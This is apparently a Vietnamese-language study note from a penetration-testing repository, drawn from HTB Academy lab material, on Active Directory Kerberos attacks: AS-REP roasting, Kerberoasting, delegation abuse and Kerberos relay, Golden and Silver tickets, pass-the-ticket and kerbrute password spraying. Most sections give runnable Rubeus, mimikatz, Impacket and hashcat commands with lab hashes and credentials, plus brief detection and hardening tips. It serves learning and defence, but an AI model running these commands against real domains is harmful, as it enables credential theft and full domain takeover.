# 18 — Kerberos Attacks

Tài liệu đi sâu các kiểu tấn công Kerberos, **biên soạn bám sát bài viết
["Kerberos Attacks" của Hacer Dalkıran](https://hacerdalkiran.medium.com/kerberos-attacks-c21473d5a378)**
(ghi chú chủ yếu từ **HTB Academy**), diễn giải chi tiết + giữ nguyên mọi lệnh,
bổ sung phần phát hiện/phòng thủ. Xem thêm nền tảng giao thức ở
[file 07 — Kerberos & NTLM](../AD-concepts/07-xac-thuc-kerberos-ntlm.md).

## Phân loại 3 nhóm tấn công (theo bài viết)

1. **Ticket Requesting Attacks** — xin vé AS-REP / TGS-REP:
   - **AS-REP Roasting** → nhắm **TGT** (mật khẩu user).
   - **Kerberoasting** → nhắm **TGS** & mật khẩu **service account**.
2. **Kerberos Delegation Attacks** — mạo danh quyền truy cập của user:
   - **Unconstrained** / **Constrained** / **Resource-Based Constrained (RBCD)**.
3. **Ticket Forging Attacks** — TGT mã hoá bằng khóa KDC, TGS mã hoá bằng khóa
   service; trộm được một trong hai → forge vé:
   - **Silver Ticket** (forge TGS) / **Golden Ticket** (forge TGT).

---

# 1. Ticket Requesting Attacks

## 1.1. AS-REP Roasting
**Cơ chế:** phát sinh từ **Pre-Authentication**. AS-REQ chứa username +
authenticator. Nếu user bị **tắt pre-auth** (AS-REP-roastable), thì **bất kỳ ai**
xin TGT đều được KDC trả AS-REP; AS-REP chứa phần mã hoá bằng **mật khẩu user** →
brute-force để crack.

> Enum được bằng: Impacket, PowerView, CrackMapExec, PowerShell AD module.
> Tấn công bằng: Impacket, Rubeus, CrackMapExec.
> **Targeted AS-REP roasting:** nếu có `GenericWrite`/`GenericAll` trên một
> account, có thể **tự bật** cờ này để biến account thành AS-REP-roastable.

### Enumeration
**1 — PowerView**
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```
**2 — Rubeus**
```powershell
Rubeus.exe asreproast /format:hashcat
.\Rubeus.exe asreproast /nowrap
```
**3 — CrackMapExec**
```bash
crackmapexec ldap LDAPFQDN -u users.txt -p '' --asreproast asreproast.out
# nếu đã có 1 credential, để mở rộng thông tin:
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out
```
**4 — GetNPUsers.py (Impacket)**
```powershell
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O
```
```bash
GetNPUsers.py DOMAIN/USER            # enumeration
GetNPUsers.py DOMAIN/USER -request   # lấy hash
```

### Targeted AS-REP Roasting
Có `GenericAll` trên account → thay vì reset mật khẩu, **bật cờ
`DONT_REQ_PREAUTH`** để biến account thành roastable (PowerView):
```powershell
Import-Module .\PowerView.ps1
Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
```
*(4194304 = 0x400000 = cờ DONT_REQ_PREAUTH; XOR để bật/tắt.)*

**Phát hiện/phòng thủ:** không tắt pre-auth; mật khẩu dài + AES-only; giám sát
event `4768` với pre-auth type 0.

---

## 1.2. Kerberoasting
**Cơ chế:** user có **SPN** → bất kỳ domain user nào cũng xin được TGS; phần TGS
mã hoá bằng **NT hash của tài khoản service** → crack offline lấy mật khẩu service.

> **Ghi chú (bài viết):** vé mã hoá **RC4** bắt đầu `$krb5tgs$23$*`, vé **AES**
> bắt đầu `$krb5tgs$18$*`.

### Lấy SPN & vé
**1 — PowerView**
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -SPN
# lấy service ticket, xuất hashcat:
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
cat .\tgs.csv
# cách tự động hơn:
Import-Module .\PowerView.ps1
Invoke-Kerberoast
```
**2 — Rubeus**
```powershell
Rubeus.exe kerberoast /nowrap
```
**Cracking**
```powershell
hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O
```
**3 — GetUserSPNs.py (Impacket)**
```bash
GetUserSPNs.py inlanefreight.local/chester
GetUserSPNs.py inlanefreight.local/chester -request
hashcat -m 13100 hashes.txt rockyou.txt
```

### Kerberoast khi KHÔNG có credential hợp lệ
Cần 2 thứ: (1) **username của account tắt pre-auth** (`DONT_REQ_PREAUTH`),
(2) một hoặc nhiều **SPN mục tiêu**. Dùng tiện ích `createnetonly` của Rubeus:
```powershell
Rubeus.exe createnetonly /program:cmd.exe /show
# giả sử user dua.lipa có DONT_REQ_PREAUTH:
Rubeus.exe kerberoast /nopreauth:dua.lipa /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```

**Phát hiện/phòng thủ:** mật khẩu service dài hoặc **gMSA**; AES-only; giám sát
`4769` nhiều SPN từ 1 user, đặc biệt mã hoá `0x17` (RC4).

---

# 2. Kerberos Delegation Attacks

## 2.1. Unconstrained Delegation
**Cơ chế:** Kerberos delegation cho một service xác thực tới service khác **thay
mặt user gốc**. Ví dụ user xác thực tới WEBSRV; WEBSRV cần truy cập database bằng
quyền của chính user → `WEBSRV$` **giả danh user** khi truy cập DB (delegation).

Nếu chiếm được server bật **unconstrained delegation** và sau đó một **Domain
Admin đăng nhập**, ta trích được **TGT của họ** để di chuyển ngang và chiếm cả DC.
Chỉ admin/user có `SeEnableDelegationPrivilege` mới bật được tùy chọn này; khi bật,
cờ **`TRUSTED_FOR_DELEGATION`** được set trong UAC. *(Nguồn: HTB Academy.)*

```powershell
# Tìm TGT nằm trong TGS (bắt vé bay vào):
.\Rubeus.exe monitor /interval:5 /nowrap
# Dùng một vé để xin vé khác:
.\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
# Nếu lệnh trên không chạy, dùng renew để lấy TGT mới:
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
mimikatz.exe
lsadump::dcsync /user:jefferson.matts
# Khi đã có TGS/TGT, liệt kê file system của DC:
dir \\dc01.inlanefreight.local\c$
```

## 2.2. Constrained Delegation
**Cơ chế:** service account được giả danh user **nhưng chỉ tới một danh sách
service** nhất định.

```powershell
# Tìm user/computer có constrained delegation:
Import-Module .\PowerView.ps1
Get-DomainComputer -TrustedToAuth
```
Account `DMZ01$` có UAC `TRUSTED_TO_AUTH_FOR_DELEGATION` → constrained delegation
**with protocol transition**, service được phép delegate là
`www/WS01.inlanefreight.local`.

```powershell
# Lấy TGS hợp lệ (xem secret user):
.\mimikatz.exe privilege::debug sekurlsa::msv exit
privilege::debug
sekurlsa::msv
```
```powershell
# S4U mạo danh Administrator, đổi altservice sang HTTP:
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
# Kiểm tra vé + mở phiên WinRM:
klist
Enter-PSSession ws01.inlanefreight.local
```
**Từ Linux (Impacket):**
```bash
findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
# → sinh Administrator.ccache; dùng với psexec.py (nó tự đổi SPN on-the-fly):
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
```

## 2.3. Unconstrained Delegation (Users) — Kerberos Relay Attack
**Cơ chế:** tạo một **DNS record** trỏ về máy attacker (một "máy ảo" trong AD).
Sau đó thêm SPN `CIFS/<dns_record>` vào account (đang unconstrained) mà ta kiểm
soát. Khi nạn nhân kết nối SMB tới máy giả, nó **gửi kèm bản sao TGT trong TGS**
(vì xin vé cho `CIFS/<dns_record>`) → TGS tới IP attacker → trích TGT ra dùng.
Cần account có quyền **`GenericWrite`** trên account bị chiếm. *(Nguồn: HTB Academy.)*

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
```bash
git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx
python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207
nslookup roguecomputer.inlanefreight.local dc01.inlanefreight.local
```
```bash
python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local dc01.inlanefreight.local
```
Mọi account xác thực SMB tới `roguecomputer.inlanefreight.local` sẽ kèm bản sao
TGT trong TGS yêu cầu.
```bash
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
```
**Ép xác thực (PrinterBug):**
```bash
python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local
python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local
```
**Krbrelayx — thực hiện:**
```bash
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
secretsdump.py -k -no-pass dc01.inlanefreight.local
```

**Phòng thủ delegation:** gỡ unconstrained; đặt account nhạy vào **Protected
Users** / "Account is sensitive and cannot be delegated"; hạn chế MAQ.

---

# 3. Ticket Forging Attacks

## 3.1. Golden Ticket
**Cơ chế:** forge & ký **TGT** bằng **hash mật khẩu của account `krbtgt`**. Khi
trình vé này cho AD server, thông tin trong vé **không bị kiểm tra** và được coi
hợp lệ vì đã ký bằng hash krbtgt. Mọi thông tin user nằm trong **PAC** (được chép
vào mỗi TGS để service biết đang làm việc với ai) — trộm được krbtgt → giải mã &
**sửa PAC** (đổi nhóm user…). *(Nguồn: HTB Academy.)*

> 4 thành phần cần để forge Golden Ticket: **Domain Name**, **Domain SID**,
> **Username to Impersonate**, **KRBTGT's hash**.

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
.\mimikatz.exe
mimikatz # lsadump::dcsync /user:krbtgt /domain:inlanefreight.local
```
Có hash krbtgt → mạo danh Administrator:
```powershell
mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
# kiểm tra vé & vào DC:
klist
Enter-PSSession dc01
```
**Từ Linux:**
```bash
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass dc01.inlanefreight.local
```
**Phòng thủ:** đổi mật khẩu krbtgt **2 lần** định kỳ & sau sự cố; Protected Users.

## 3.2. Silver Ticket
**Cơ chế:** khi user xin TGS, TGS-REP chứa vé + **PAC** (thông tin user/nhóm),
**mã hoá bằng secret của service account**. Biết secret đó → forge AP-REQ, sửa
PAC (ví dụ tự nhận thuộc Domain Admins) → vé giả này là **Silver Ticket**. Khác
Golden: chỉ áp cho **một service** và **không chạm DC**.

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```
Giả sử đã chiếm account `SQL01$`, có NTLM hash; muốn forge TGS truy cập file
system `SQL01` → cần vé `CIFS/SQL01`:
```powershell
mimikatz.exe
 # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ptt
klist
dir \\sql01.inlanefreight.local\c$
```
**Sacrificial Process** (tạo vé, lưu `sql01.kirbi`, nạp vào phiên riêng):
```powershell
mimikatz.exe "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ticket:sql01.kirbi" exit
Rubeus.exe createnetonly /program:cmd.exe /show
Rubeus.exe ptt /ticket:sql01.kirbi
PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
```
**Từ Linux:**
```bash
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
ticketer.py -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator
export KRB5CCNAME=./Administrator.ccache
smbclient.py -k -no-pass sql01.inlanefreight.local
# hoặc psexec:
psexec.py -k -no-pass sql01.inlanefreight.local
```
**Phòng thủ:** bật PAC validation; mật khẩu service/máy mạnh (gMSA).

---

# 4. Pass the Ticket (PtT)
**Cơ chế:** di chuyển ngang **không chạm LSASS**. Lấy **TGT hoặc TGS** của user
(TGT là vé đã ký, chứa danh sách mức đặc quyền). **Sacrificial process** tạo một
Logon Session mới và truyền vé vào đó; `createnetonly` tạo tiến trình này, lệnh
sau dùng `/LUID:0xdeadbeef` để tương tác với nó.

```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# xem các vé đọc được:
.\Rubeus.exe triage
# trích vé:
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
# gia hạn + nạp:
Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
```

---

# 5. Account Enumeration & Password Spraying bằng Kerberos
**Cơ chế:** brute-force username/password qua Kerberos **nhanh và kín hơn** —
pre-auth fail **không** sinh event `4625` ("An account failed to log on"). Chỉ cần
gửi **một UDP frame** tới KDC để kiểm tra username/login.

```bash
mv ~/Downloads/kerbrute_linux_amd64 kerbrute
chmod +x ./kerbrute
./kerbrute
```
**Username enumeration:** kerbrute gửi TGT request không pre-auth; KDC trả
`PRINCIPAL UNKNOWN` = user không tồn tại; nếu KDC đòi pre-auth = user tồn tại.
Không gây logon failure (không lock account). Sinh event `4768` nếu bật Kerberos
logging.
```bash
kerbrute userenum users.txt --dc dc01.inlanefreight.local -d inlanefreight.local
```
**Password spraying:**
```bash
kerbrute passwordspray users.txt inlanefreight2020 --dc dc01.inlanefreight.local -d inlanefreight.local
```

---

# 6. Additional Notes
Kiểm tra lần đổi mật khẩu krbtgt gần nhất (đánh giá rủi ro Golden Ticket & khi
nào cần đổi 2 lần):
```powershell
Get-ADUser krbtgt -Property PasswordLastSet
```

---

## Tham chiếu chéo trong repo
- Giao thức Kerberos (TGT/TGS/PAC/SPN): [07-xac-thuc-kerberos-ntlm.md](../AD-concepts/07-xac-thuc-kerberos-ntlm.md)
- Khai thác theo mindmap: [delegation](../mindmaps/AD-2025.03/05-kerberos-delegation.md),
  [credentials](../mindmaps/AD-2025.03/07-credentials-harvesting.md),
  [domain admin/persistence](../mindmaps/AD-2025.03/12-domain-admin-persistence.md)
- Quy trình OSCP: [02](../OSCP-AD/02-co-username.md), [03](../OSCP-AD/03-co-credential-enum.md),
  [08](../OSCP-AD/08-domain-admin-persistence.md)

## Nguồn
- Hacer Dalkıran — *"Kerberos Attacks"*, Medium, 17/02/2025:
  https://hacerdalkiran.medium.com/kerberos-attacks-c21473d5a378 (ghi chú từ HTB Academy)
- Bài liên quan cùng tác giả: *"Kerberos Attacks: Silver Ticket"*
  https://hacerdalkiran.medium.com/kerberos-attacks-silver-ticket-6f671a3039fb
- RFC 4120; [MS-KILE]; [MS-PAC]; adsecurity.org; The Hacker Recipes.
